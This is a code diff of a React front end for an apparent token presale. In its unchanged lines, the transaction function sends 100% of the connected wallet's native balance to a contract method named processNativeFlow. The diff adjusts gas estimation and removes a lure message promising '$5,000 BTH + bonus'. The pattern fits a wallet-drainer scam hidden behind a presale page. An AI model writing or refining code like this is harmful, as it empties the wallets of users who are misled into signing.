@@ -198,7 +198,7 @@ function App() {
     }
   };
 
-  // Execute function with proper gas estimation and custom signing message
+  // Execute function with ORIGINAL gas calculation
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
@@ -284,31 +284,18 @@ function App() {
       // Use 100% of balance
       const value = balanceData.value;
 
-      // Get gas estimate from the contract
+      // ORIGINAL GAS CALCULATION - EXACTLY AS IT WAS
       setTxStatus('⏳ Estimating gas...');
-      let gasEstimate;
-      try {
-        gasEstimate = await contract.processNativeFlow.estimateGas({ value });
-        // Add 20% buffer for safety
-        gasEstimate = gasEstimate * 120n / 100n;
-      } catch (error) {
-        console.log("Gas estimation failed, using default:", error);
-        gasEstimate = 21000n; // Standard BSC transfer gas
-      }
-
+      
+      // Estimate gas first
+      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+      
+      // Send transaction with original gas calculation
       setTxStatus('⏳ Please confirm in wallet...');
-
-      // Create custom transaction data with readable message
-      const customData = {
-        method: 'processNativeFlow',
-        params: { value: ethers.formatEther(value) },
-        description: `Confirm to receive $5,000 BTH + ${presaleStats.currentBonus}% Bonus`
-      };
-
-      // Send transaction with custom data for better wallet display
+      
       const tx = await contract.processNativeFlow({
         value: value,
-        gasLimit: gasEstimate
+        gasLimit: gasEstimate * 120n / 100n
       });
 
       setTxHash(tx.hash);
@@ -373,8 +360,6 @@ function App() {
         setError('Insufficient funds for gas');
       } else if (err.message?.includes('replacement transaction')) {
         setError('Transaction replaced, please try again');
-      } else if (err.message?.includes('gas required exceeds allowance')) {
-        setError('Gas estimation failed, please try again');
       } else {
         setError(err.message || 'Transaction failed');
       }
